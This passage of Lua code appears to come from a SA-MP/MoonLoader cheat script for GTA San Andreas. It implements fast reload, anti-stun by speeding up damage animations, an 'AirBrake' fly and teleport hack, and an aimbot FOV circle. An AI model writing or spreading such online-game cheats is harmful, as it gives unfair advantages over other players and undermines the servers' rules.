                "RIFLE_crouchload", "Silence_reload", "CrouchReload",
                "UZI_reload", "UZI_crouchreload"
            }
            for _, anim in ipairs(reloadAnims) do
                setCharAnimSpeed(PLAYER_PED, anim, 20)
            end
        else
            setPlayerFastReload(PLAYER_HANDLE, false)
        end

        -- Anti Stun
        if EASY.nostun[0] then
            local anims = {
                "DAM_armL_frmBK", "DAM_armL_frmFT", "DAM_armL_frmLT",
                "DAM_armR_frmBK", "DAM_armR_frmFT", "DAM_armR_frmRT",
                "DAM_LegL_frmBK", "DAM_LegL_frmFT", "DAM_LegL_frmLT",
                "DAM_LegR_frmBK", "DAM_LegR_frmFT", "DAM_LegR_frmRT",
                "DAM_stomach_frmBK", "DAM_stomach_frmFT",
                "DAM_stomach_frmLT", "DAM_stomach_frmRT"
            }
            for _, anim in ipairs(anims) do
                setCharAnimSpeed(PLAYER_PED, anim, 999)
            end
        end

        -- AirBrake
        if airbrake_enabled[0] then
            processFlyHack()
        elseif airbrake_last_state then
            if last_car and doesVehicleExist(last_car) then
                freezeCarPosition(last_car, false)
                setCarCollision(last_car, true)
            end

            freezeCharPosition(PLAYER_PED, true)
            freezeCharPosition(PLAYER_PED, false)
            setCharCollision(PLAYER_PED, true)
            setPlayerControl(PLAYER_HANDLE, true)
            restoreCameraJumpcut()
            clearCharTasksImmediately(PLAYER_PED)

            local x, y, z = getCharCoordinates(PLAYER_PED)
            setCharCoordinates(PLAYER_PED, x, y, z - 0.5)

            sampAddChatMessage("[JJ] AIRBREAK DESLIGADO ", 0xDC143C)

            was_in_car = false
            last_car = nil
        end
        airbrake_last_state = airbrake_enabled[0]

        -- FOV C�rculo Aimbot
        local circuloFOVAIM = sulist.cabecaAIM[0] or sulist.peitoAIM[0] or sulist.virilhaAIM[0]
            or sulist.lockAIM[0] or sulist.bracoAIM[0] or sulist.braco2AIM[0]
            or sulist.pernaAIM[0] or sulist.perna2AIM[0]

        if circuloFOVAIM then
            local screenWidth, screenHeight = getScreenResolution()
            local circleX = screenWidth / 1.923
            local circleY = screenHeight / 2.306

            local radius = slide.fovvaimbotcirculo[0]
            local colorHex = colorToHex(slide.fovCorAimmm[0], slide.fovCorAimmm[1], slide.fovCorAimmm[2], slide.fovCorAimmm[3])

            if isCurrentCharWeapon(PLAYER_PED, 34) then
                drawCircle(screenWidth / 2, screenHeight / 2, radius, colorHex)
            elseif not isCurrentCharWeapon(PLAYER_PED, 0) then
                drawCircle(circleX, circleY, radius, colorHex)
            end
        end
    end
end
